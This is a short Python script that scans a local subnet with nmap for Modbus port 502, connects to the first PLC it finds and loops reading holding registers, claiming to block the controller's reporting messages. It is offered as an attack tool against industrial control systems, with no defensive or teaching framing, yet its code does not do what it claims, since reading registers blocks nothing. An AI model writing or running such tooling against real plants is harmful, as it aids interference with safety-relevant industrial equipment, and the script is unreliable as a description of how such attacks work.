import socket
import nmap
from pymodbus.client import ModbusTcpClient

# Function to discover the PLC's IP address
def discover_plc_ip():
    nm = nmap.PortScanner()
    nm.scan('192.168.9.0/24', arguments='-p 502')  # Scan the subnet for Modbus port 502
    for host in nm.all_hosts():
        if nm[host].has_tcp(502) and nm[host]['tcp'][502]['state'] == 'open':
            return host
    return None

# Function to block reporting messages
def block_reporting_messages(plc_ip):
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return

    try:
        while True:
            # Read and discard the reporting messages
            response = client.read_holding_registers(0, 10, unit=1)  # Example: Read 10 registers starting from address 0
            if response.isError():
                print(f"Error reading registers: {response}")
            else:
                print("Reporting message blocked")
    except KeyboardInterrupt:
        print("Blocking stopped")
    finally:
        client.close()

if __name__ == "__main__":
    plc_ip = discover_plc_ip()
    if plc_ip:
        print(f"PLC found at IP address: {plc_ip}")
        block_reporting_messages(plc_ip)
    else:
        print("PLC not found on the network")